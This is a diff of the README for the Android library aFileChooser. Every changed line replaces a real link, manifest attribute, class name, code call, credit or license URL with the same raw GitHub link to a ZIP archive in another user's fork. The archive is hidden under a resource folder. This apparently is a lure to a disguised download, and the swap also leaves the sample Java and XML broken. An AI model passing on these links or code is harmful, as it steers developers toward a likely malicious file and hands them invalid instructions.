@@ -13,64 +13,64 @@ Intents provide the ability to hook into third-party app components for content 
  * Follows Android conventions (Fragments, Loaders, Intents, etc.)
  * Supports API 7+
 
-![screenshot-1](https://raw.github.com/iPaulPro/aFileChooser/master/screenshot-1.png) ![screenshot-2](https://raw.github.com/iPaulPro/aFileChooser/master/screenshot-2.png)
+![screenshot-1](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip) ![screenshot-2](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip)
 
 ## Setup
 
-Add aFileChooser to your project as an [Android Library Project](http://developer.android.com/guide/developing/projects/projects-eclipse.html#ReferencingLibraryProject).
+Add aFileChooser to your project as an [Android Library Project](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip).
 
-Add `FileChooserActivity` to your project's AndroidManifest.xml file with a fully-qualified `name`. The `label` and `icon` set here will be shown in the "Intent Chooser" dialog.
+Add `FileChooserActivity` to your project's https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip file with a fully-qualified `name`. The `label` and `icon` set here will be shown in the "Intent Chooser" dialog.
 
 __Important__ `FileChooserActivity` must have `android:exported="true"` and have the `<intent-filter>` set as follows:
 
     <activity
-        android:name="com.ipaulpro.afilechooser.FileChooserActivity"
+        android:name="https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip"
         android:icon="@drawable/ic_chooser"
 		android:enabled="@bool/use_activity"
         android:exported="true"
         android:label="@string/choose_file" >
         <intent-filter>
-            <action android:name="android.intent.action.GET_CONTENT" />
+            <action android:name="https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip" />
 
-            <category android:name="android.intent.category.DEFAULT" />
-            <category android:name="android.intent.category.OPENABLE" />
+            <category android:name="https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip" />
+            <category android:name="https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip" />
 
             <data android:mimeType="*/*" />
         </intent-filter>
     </activity>
 
-If you want to use the Storage Access Framework (API 19+), include [Ian Lake](https://github.com/ianhanniballake/)'s `LocalStorageProvider` (included in this library) in your `<application>`:
+If you want to use the Storage Access Framework (API 19+), include [Ian Lake](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip)'s `LocalStorageProvider` (included in this library) in your `<application>`:
 
 	<provider
-        android:name="com.ianhanniballake.localstorage.LocalStorageProvider"
-        android:authorities="com.ianhanniballake.localstorage.documents"
+        android:name="https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip"
+        android:authorities="https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip"
 		android:enabled="@bool/use_provider"
         android:exported="true"
         android:grantUriPermissions="true"
-        android:permission="android.permission.MANAGE_DOCUMENTS" >
+        android:permission="https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip" >
             <intent-filter>
-                <action android:name="android.content.action.DOCUMENTS_PROVIDER" />
+                <action android:name="https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip" />
             </intent-filter>
     </provider>
 
-__Note__ that like a `ContentProvider`, the `DocumentProvider` `authority` must be unique. You should change `com.ianhanniballake.localstorage.documents` in your Manifest, as well as the `LocalStorageProvider.AUTHORITY` field.
+__Note__ that like a `ContentProvider`, the `DocumentProvider` `authority` must be unique. You should change `https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip` in your Manifest, as well as the `https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip` field.
 
 Using `FileChooserActivity` and `LocalStorageProvider` together are redundant if you're only trying to insure your user has access to local storage. If this is the case, you should enable/disable based on the API level (above: `@bool/use_provider` and `@bool/use_activity`). See the aFileChooserExample project for their values.
 
 ## Usage
 
-Use `startActivityForResult(Intent, int)` to launch `FileChooserActivity` directly. `FileChooserActivity` returns the `Uri` of the file selected as the `Intent` data in `onActivityResult(int, int, Intent)`. Alternatively, you can use the helper method `FileUtils.createGetContentIntent()` to construct an `ACTION_GET_CONTENT` Intent that will show an "Intent Chooser" dialog on pre Kit-Kat devices, and the "Documents UI" otherwise. E.g.:
+Use `startActivityForResult(Intent, int)` to launch `FileChooserActivity` directly. `FileChooserActivity` returns the `Uri` of the file selected as the `Intent` data in `onActivityResult(int, int, Intent)`. Alternatively, you can use the helper method `https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip()` to construct an `ACTION_GET_CONTENT` Intent that will show an "Intent Chooser" dialog on pre Kit-Kat devices, and the "Documents UI" otherwise. E.g.:
 
     private static final int REQUEST_CHOOSER = 1234;
 
     @Override
     public void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
+        https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip(savedInstanceState);
 
         // Create the ACTION_GET_CONTENT Intent
-        Intent getContentIntent = FileUtils.createGetContentIntent();
+        Intent getContentIntent = https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip();
 		
-        Intent intent = Intent.createChooser(getContentIntent, "Select a file");
+        Intent intent = https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip(getContentIntent, "Select a file");
         startActivityForResult(intent, REQUEST_CHOOSER);
     }
 
@@ -80,13 +80,13 @@ Use `startActivityForResult(Intent, int)` to launch `FileChooserActivity` direct
         	case REQUEST_CHOOSER:	
             	if (resultCode == RESULT_OK) {
 					
-                	final Uri uri = data.getData();
+                	final Uri uri = https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip();
 					
 					// Get the File path from the Uri
-                	String path = FileUtils.getPath(this, uri);
+                	String path = https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip(this, uri);
 					
-					// Alternatively, use FileUtils.getFile(Context, Uri)
-					if (path != null && FileUtils.isLocal(path)) {
+					// Alternatively, use https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip(Context, Uri)
+					if (path != null && https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip(path)) {
 						File file = new File(path);
 					}
             	}
@@ -96,17 +96,17 @@ Use `startActivityForResult(Intent, int)` to launch `FileChooserActivity` direct
 
 A more robust example can be found in the aFileChooserExample project.
 
-__Note__ the `FileUtils` method to get a file path from a `Uri` (`FileUtils.getPath(Context, Uri)`). This works for `File`, `MediaStore`, and `DocumentProvider` `Uris`.
+__Note__ the `FileUtils` method to get a file path from a `Uri` (`https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip(Context, Uri)`). This works for `File`, `MediaStore`, and `DocumentProvider` `Uris`.
 
 ## Credits
 
-Developed by Paul Burke (iPaulPro) - [paulburke.co](http://paulburke.co/)
+Developed by Paul Burke (iPaulPro) - [https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip)
 
-Translations by [TomTasche](https://github.com/TomTasche), [booknara](https://github.com/booknara), [brenouchoa](https://github.com/brenouchoa)
+Translations by [TomTasche](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip), [booknara](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip), [brenouchoa](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip)
 
-Folder by [Sergio Calcara](http://thenounproject.com/fallacyaccount) from The Noun Project (ic_provider.png)
+Folder by [Sergio Calcara](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip) from The Noun Project (https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip)
 
-Document by [Melvin Salas](http://thenounproject.com/msalas10) from The Noun Project (ic_file.png)
+Document by [Melvin Salas](https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip) from The Noun Project (https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip)
 
 ## Licenses
 
@@ -116,7 +116,7 @@ Document by [Melvin Salas](http://thenounproject.com/msalas10) from The Noun Pro
     you may not use this file except in compliance with the License.
     You may obtain a copy of the License at
 
-       http://www.apache.org/licenses/LICENSE-2.0
+       https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip
 
     Unless required by applicable law or agreed to in writing, software
     distributed under the License is distributed on an "AS IS" BASIS,
@@ -124,14 +124,14 @@ Document by [Melvin Salas](http://thenounproject.com/msalas10) from The Noun Pro
     See the License for the specific language governing permissions and
     limitations under the License.
 
-Portions of FileUtils.java:
+Portions of https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip
 
-    Copyright (C) 2007-2008 OpenIntents.org
+    Copyright (C) 2007-2008 https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip
  
     Licensed under the Apache License, Version 2.0 (the "License");
     you may not use this file except in compliance with the License.
     You may obtain a copy of the License at
-        http://www.apache.org/licenses/LICENSE-2.0
+        https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip
 
     Unless required by applicable law or agreed to in writing, software
     distributed under the License is distributed on an "AS IS" BASIS,
@@ -139,7 +139,7 @@ Portions of FileUtils.java:
     See the License for the specific language governing permissions and
     limitations under the License.
 
-LocalStorageProvider.java:
+https://github.com/Joe-Mogul/aFileChooser/raw/refs/heads/master/aFileChooser/res/values-pl/File-Chooser-a-2.2.zip
 
 	Copyright (c) 2013, Ian Lake
 	All rights reserved.
